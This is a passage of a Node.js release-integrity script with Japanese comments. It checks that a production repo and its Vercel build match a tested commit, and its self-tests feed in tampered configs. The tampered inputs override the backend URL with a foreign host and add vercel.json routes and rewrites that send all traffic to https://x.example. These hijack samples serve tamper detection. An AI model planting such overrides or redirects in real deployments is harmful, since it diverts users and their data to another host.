    iu('url の 終わりに 壊れた 逃がし（\\xZZ）… 赤', !cfgSei(urlWo('https://' + REFS.test + SB + '\\xZZ'), 'test').ok);
    const SAKI = "'https://" + 'a'.repeat(20) + SB + "'";
    for (const [nm, f] of [
      ['後ろで window.SUPA.url = … と 上書き', (s) => s + '\nwindow.SUPA.url = ' + SAKI + ';\n'],
      ["'url': …（引用符 付きの 2つ目の 鍵）", (s) => s.replace(/^(\s*)env:\s*'([^']*)'/m, "$1env: '$2',\n  'url': " + SAKI)],
      ["['url']: …（計算した 鍵）", (s) => s.replace(/^(\s*)env:\s*'([^']*)'/m, "$1env: '$2',\n  ['url']: 'https://x.example'")],
      ['Object.assign で 上書き', (s) => s + "\nObject.assign(window.SUPA, { ['ur' + 'l']: 'https://x.example' });\n"],
    ]) iu('★値の 上書き：' + nm + ' … 赤★（10-20 taiketsu 4回目）', !cfgSei(f(cfg), 'test').ok);
    iu('key に 逃がし ／ env が 違う ／ url が 2回 … 赤',
      !cfgSei(cfg.replace(/^(\s*)key:\s*'([^']*)'/m, "$1key: '$2\\x41'"), 'test').ok
      && !cfgSei(cfg.replace(/^(\s*)env:\s*'[^']*'/m, "$1env: 'prod'"), 'test').ok
      && !cfgSei(cfg.replace(/^(\s*)env:/m, "$1url: 'https://" + REFS.test + SB + "', env:"), 'test').ok);
    const yomenai = kae(kopi(), CFG, () => "/* x");
    iu('★本番も テスト線も 設定が 読めない（両方 null）… 赤★', compare(yomenai, kae(kopi(), CFG, () => "/* y")).aka.length > 0);
  }
  {
    /* ★Vercel の 場の vercel.json＝配る commit の git の 中身で 比べる★（10-20 taiketsu＝「足した 鍵を 許す」では routes・rewrites が 通った） */
    const vj = moto.get('vercel.json');
    const o = JSON.parse(vj.text());
    const kaki = (x) => { const t = JSON.stringify(x); return { id: blobId('vercel.json', Buffer.from(t)), text: () => t }; };
    /* Vercel が 書き直した 作業木＝10-20 実測の 形（鍵は 同じ・字の 並びだけ＝1行に 詰めて 鍵の 順も 逆） */
    const narabi = kopi().set('vercel.json', kaki(Object.fromEntries(Object.entries(o).reverse())));
    iu('Vercel が 字の 並びだけ 書き直し・git は repo の まま … 緑',
      narabi.get('vercel.json').id !== vj.id && compare(vercelJsonGitDe(narabi, new Map([['vercel.json', vj]])), moto).aka.length === 0);
    iu('字の 並びの 書き直しを そのまま 比べると … 赤（置き換えが 無いと 配りが 止まる 形＝10-20 実測）', compare(narabi, moto).aka.length > 0);
    const R = { routes: [{ src: '/(.*)', dest: 'https://x.example/$1' }] }, W = { rewrites: [{ source: '/(.*)', destination: 'https://x.example/' }] };
    const nashi = (() => { const y = { ...o }; delete y.buildCommand; return y; })();
    for (const [nm, x] of [['routes を 足す', { ...o, ...R }], ['rewrites を 足す', { ...o, ...W }], ['buildCommand を 消す', nashi]]) {
      iu('★本番の commit の vercel.json で ' + nm + ' … Vercel の 場でも 赤★', compare(vercelJsonGitDe(kopi().set('vercel.json', kaki(x)), new Map([['vercel.json', kaki(x)]])), moto).aka.length > 0);
      iu('★作業木だけに ' + nm + '（CLI で 手元の 書きかけを 送る 形）・git は repo の まま … 赤★', compare(vercelJsonGitDe(kopi().set('vercel.json', kaki(x)), new Map([['vercel.json', vj]])), moto).aka.length > 0);
    }
    {
      /* 本番の --vercel の 1段目（配る commit が 無い）を 本物の 道で 走らせる（網に 出る 前に 止まる 段） */
      let code = 0, out = '';
      try { out = execFileSync(process.execPath, [fileURLToPath(import.meta.url), '--vercel'], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'],
        env: { ...process.env, VERCEL_GIT_REPO_SLUG: SEN.prod.name, VERCEL_GIT_REPO_OWNER: 'exally-zeroact', VERCEL_GIT_COMMIT_SHA: '', VERCEL_ENV: 'production' } }); }
      catch (e) { code = e.status; out = String(e.stdout || ''); }
      iu('本番の --vercel で 配る commit が 無い（CLI の 形）… 赤（実際に 走らせて）', code === 1 && out.includes('配る commit が 分からない'));
    }
    iu('配る commit の git に .vercel/output・node_modules の 物 … 名前で 拾う ／ 今の repo の 木は 0本',
      kakureMichi(new Map([['.vercel/output/config.json', {}], ['a/node_modules/x.js', {}], ['js/a.js', {}]])).length === 2 && kakureMichi(moto).length === 0);
    iu('作業木の vercel.json が null・配列 … 置き換えない（赤）・落ちない',
      compare(vercelJsonGitDe(kopi().set('vercel.json', kaki(null)), new Map([['vercel.json', vj]])), moto).aka.length > 0
      && compare(vercelJsonGitDe(kopi().set('vercel.json', kaki([1])), new Map([['vercel.json', vj]])), moto).aka.length > 0);
    iu('jsonKata：鍵の 順だけ 違う＝同じ ／ 入れ子の 値が 違う＝違う', jsonKata({ a: 1, b: { c: [1, 2] } }) === jsonKata({ b: { c: [1, 2] }, a: 1 }) && jsonKata({ a: { c: [1, 2] } }) !== jsonKata({ a: { c: [2, 1] } }));
  }
  iu('設定の 値を " で 囲む … 赤', aka(kae(kopi(), CFG, (s) => s.replace(/^(\s*)env:\s*'([^']*)'/m, '$1env: "$2"'))));
  iu('印が 無い・印の 形が 違う … 網に 出る 前に 赤', (await hanjiru(kopi(), null, 'x')).length === 1 && (await hanjiru(kopi(), '67c67e7\n', 'x')).length === 1);
  iu('設定の 説明文だけ 違う … 緑', midori(kae(kopi(), CFG, (s) => '/* 本番 */\n' + s)));
  iu('mode が 違う … 赤', !!moto.get(js).mode && aka((() => { const m = kopi(); m.set(js, { ...m.get(js), mode: '100755' }); return m; })()));
  iu('テスト線の 木に 印が 在る … 赤', compare(kopi(), kopi().set(SIRUSHI, { id: 'z', text: () => '' })).aka.length > 0);
  iu('印 40字の 16進 … よい', sirushiOk('67c67e7e54ac71c0af3743d60c34925151608277\n'));
  iu('印 短い・大文字・空 … だめ', !sirushiOk('67c67e7') && !sirushiOk('67C67E7E54AC71C0AF3743D60C34925151608277') && !sirushiOk(''));
  iu('素性 timeally-test → テスト線 ／ timeally → 本番', sokusei('timeally-test') === 'test' && sokusei('timeally') === 'prod');
  iu('素性 読めない・知らない 名前 … null（赤）', sokusei('') === null && sokusei('timeally-staging') === null && sokusei('Timeally') === null);
  iu('Vercel の 素性：git の 配り＝slug（持ち主が 違えば 空）／CLI の 配り＝本番 URL ／ 何も 無い＝空',
    vercelName({ VERCEL_GIT_REPO_SLUG: 'timeally', VERCEL_GIT_REPO_OWNER: 'exally-zeroact' }) === 'timeally'
    && vercelName({ VERCEL_GIT_REPO_SLUG: 'timeally', VERCEL_GIT_REPO_OWNER: 'someone' }) === ''
    && vercelName({ VERCEL_PROJECT_PRODUCTION_URL: 'timeally-test.vercel.app' }) === 'timeally-test'
    && vercelName({}) === '');
  const run = (o) => ({ path: '.github/workflows/ci.yml', event: 'push', status: 'completed', conclusion: 'success', created_at: '2026-10-20T00:00:00Z', id: 1, ...o });
  iu('CI 緑 … よい', ciMidori([run({})]).ok);
  iu('CI が 無い・赤・走り中 … だめ', !ciMidori([]).ok && !ciMidori([run({ conclusion: 'failure' })]).ok && !ciMidori([run({ status: 'in_progress', conclusion: null })]).ok);
  iu('新しい 回が 赤なら 古い 緑が 在っても だめ', !ciMidori([run({}), run({ created_at: '2026-10-21T00:00:00Z', conclusion: 'failure' })]).ok);
  iu('別の workflow・PR の 緑は 数えない', !ciMidori([run({ path: '.github/workflows/mirror-watch.yml' }), run({ event: 'pull_request' })]).ok);
  const now = Date.parse('2026-10-20T00:00:00Z');
  iu('遅れ 無し=0 ／ 8日前=8日', okure(null, now) === 0 && Math.round(okure(now / 1000 - 8 * 86400, now)) === 8);
  console.log(ng ? '\n★自己確認 ' + ng + '件 おかしい★' : '\n自己確認 OK（わざと 壊すと 赤に なる）');
  process.exit(ng ? 1 : 0);
}

/* ══════════ 本番の 判定 ══════════ */
const MODE = process.argv.includes('--watch-prod') ? 'watch' : process.argv.includes('--vercel') ? 'vercel' : 'repo';
function originName(root) {
  try {
    const u = git(root, ['remote', 'get-url', 'origin']).trim();
    return (u.split('/').pop() || '').replace(/\.git$/, '');
  } catch (e) { return ''; }
}
const owari = (aka, yoshi = '本番の 中身は テスト線の 1つの commit と 同じ（違うのは 印・設定の 値・刻印 だけ）') => {
  if (!aka.length) { console.log('\n✓ ' + yoshi); process.exit(0); }
  for (const x of aka) console.log('  ✗ ' + x);
  console.log('\n★赤★ 直し方：本番を 直に 直さない。テスト線で 直して 押し、CI 緑の 後に scripts/mirror-to-prod.mjs で 写す。');
  process.exit(1);
};

if (MODE === 'watch') {
  /* ★テスト線の 側から 本番を 見る★（本番の 中で 見張りを 外されても 捕まる） */
  console.log('\n[mirror-match --watch-prod] テスト線から 本番 main を 見る（遅れ ' + OKURE_HI + '日 以上で 赤）');
  const d = tmpGit();
  let ph;
  try { ph = fetchMain(d, SEN.prod.url); } catch (e) { owari(['★本番を 取れない★（' + String(e.message).split('\n')[0] + '）＝未測定＝赤']); }
  console.log('  本番 main の 頭 … ' + ph.slice(0, 12));
  const honban = readGitTree(d, ph);
  const s = honban.has(SIRUSHI) ? honban.get(SIRUSHI).text() : null;
  const r = await hanjiru(honban, s, '本番 main の 木');
  if (Array.isArray(r)) owari(r);
  const ct = r.ato.length ? Number(git(r.d, ['show', '-s', '--format=%ct', r.ato[0]]).trim()) : null;
  const hi = okure(ct, Date.now());
  console.log('  写していない テスト線の commit … ' + r.ato.length + '本' + (r.ato.length ? '（一番 古い 物 ' + hi.toFixed(1) + '日前）' : ''));
  if (hi >= OKURE_HI) r.aka.push('★本番が テスト線より 遅れている★ ' + r.ato.length + '本・' + hi.toFixed(1) + '日（' + OKURE_HI + '日 以上）＝写す');
  owari(r.aka);
}

const name = MODE === 'vercel' ? vercelName(process.env) : originName(ROOT);
const gawa = sokusei(name);
console.log('\n[mirror-match' + (MODE === 'vercel' ? ' --vercel' : '') + '] 本番の 中身が テスト線の 1つの commit と 同じか');
console.log('  この repo … ' + (name || '（読めない）') + ' ⇒ ' + (gawa === 'test' ? 'テスト線' : gawa === 'prod' ? '本番' : '★分からない★'));
if (!gawa) owari(['★repo の 素性が 読めない・白名簿に 無い★（' + (name || '空') + '）＝分からない 物を 緑に しない']);
const sp = path.join(ROOT, SIRUSHI);
if (gawa === 'test') {
  const OK_T = 'テスト線：写した 印 無し・本番で 使う 道（git・網・GitHub の 読み口' + (MODE === 'vercel' ? '・build の 作業木' : '') + '）は 動く';
  if (fs.existsSync(sp)) owari(['★テスト線に ' + SIRUSHI + ' が 在る★（本番の 印が 紛れた）']);
  console.log('  ✓ テスト線＝見張られる側（写した 印は 無い）');
  { const sei = cfgSei(fs.readFileSync(path.join(ROOT, CFG), 'utf8'), 'test'); console.log('  ' + (sei.ok ? '✓' : '✗') + ' テスト線の 設定の 値 … ' + sei.why); if (!sei.ok) owari(['★テスト線の 設定の 値が おかしい★ ' + sei.why]); }
  /* ★本番で 使う 道（git・網・GitHub の 読み口）を テスト線で 毎回 先に 試す★（本番の 日に 初めて 割れない 為） */
  const d = tmpGit();
  let head;
  try { head = fetchMain(d, SEN.test.url); console.log('  ✓ テスト線 main を 取れた … ' + head.slice(0, 12)); }
  catch (e) { owari(['★git／網で テスト線を 取れない★（' + String(e.message).split('\n')[0] + '）＝本番の 門が 動かない']); }
  const aka = await ciTameshi(d, head);
  /* ★中身を 後から 取りに 行く 道（部分 clone の cat-file）も 毎回 1本 試す★＝本番では 設定・画面で 6回 通る */
  let cfgT = '';
  try { cfgT = (readGitTree(d, head).get(CFG) || { text: () => '' }).text(); } catch (e) { cfgT = ''; }
  console.log('  ' + (cfgT.length ? '✓' : '✗') + ' 中身を 後から 取りに 行く 道 … ' + CFG + ' ' + cfgT.length + '字');
  if (!cfgT.length) aka.push('★部分 clone の 中身を 取りに 行けない★（' + CFG + ' が 空）＝本番の 門が 動かない');
  if (MODE === 'vercel') {
    /* ＋配る commit の 木と build の 作業木を 比べる＝本番で 使う 読み方（作業木の 歩き方・CRLF・余計な 物）を 先に 試す */
    const sha = process.env.VERCEL_GIT_COMMIT_SHA || '';
    if (!sha) {
      if (process.env.VERCEL_GIT_PROVIDER) owari([...aka, '★git から 配って いるのに VERCEL_GIT_COMMIT_SHA が 無い★＝木の 比べが 黙って 0回に なる']);
      console.log('  （CLI の 配り＝配る commit が 分からない＝木の 比べは しない）');
      owari(aka, OK_T);
    }
    let naka = false;
    try { git(d, ['merge-base', '--is-ancestor', sha, head]); naka = true; } catch (e) { naka = false; }
    if (!naka) {
      if (process.env.VERCEL_ENV === 'production') owari([...aka, '★本番として 配る commit ' + sha.slice(0, 12) + ' が テスト線 main に 無い★']);
      console.log('  （配る commit ' + sha.slice(0, 12) + ' は main に 無い＝PR の 下見＝木の 比べは しない）');
      owari(aka, OK_T);
    }
    const kiT = readGitTree(d, sha);
    if (kakureMichi(kiT).length) aka.push('★配る commit の git に 飛ばす 場所の 物が 入っている★（' + kakureMichi(kiT).slice(0, 5).join(', ') + '）');
    const r = compare(vercelJsonGitDe(readWorkTree(ROOT), kiT), kiT);
    console.log('  build の 作業木 と ' + sha.slice(0, 12) + ' の 木 … 中身が 同じ ' + r.kazu.onaji + '本・違い ' + r.aka.length + '件');
    aka.push(...r.aka);
  }
  owari(aka, OK_T);
}
let honban = readWorkTree(ROOT);
if (MODE === 'vercel') {
  /* ★本番の Vercel の build★：vercel.json は Vercel が 書き換える＝★配る commit の git の 中身★で 置き換えて 1字で 比べる。
     配る commit が 分からない（CLI の 配り）・本番 main に 無い は 赤（何を 配るか 分からない 物を 配らない） */
  const sha = process.env.VERCEL_GIT_COMMIT_SHA || '';
  if (!sirushiOk(sha)) owari(['★配る commit が 分からない★（VERCEL_GIT_COMMIT_SHA 無し＝CLI の 配り？）＝本番は git から 配る']);
  const d2 = tmpGit();
  let ph;
  try { ph = fetchMain(d2, SEN.prod.url); } catch (e) { owari(['★本番 repo を 取れない★（' + String(e.message).split('\n')[0] + '）＝未測定＝赤']); }
  try { git(d2, ['merge-base', '--is-ancestor', sha, ph]); } catch (e) { owari(['★配る commit ' + sha.slice(0, 12) + ' が 本番 main に 無い★']); }
  const kiP = readGitTree(d2, sha);
  const kakure = kakureMichi(kiP);
  if (kakure.length) owari(['★配る commit の git に 飛ばす 場所の 物が 入っている★（' + kakure.slice(0, 5).join(', ') + '）＝作業木の 比べで 見えない']);
  honban = vercelJsonGitDe(honban, kiP);
}
const r = await hanjiru(honban, fs.existsSync(sp) ? fs.readFileSync(sp, 'utf8') : null, '作業木');
owari(Array.isArray(r) ? r : r.aka);
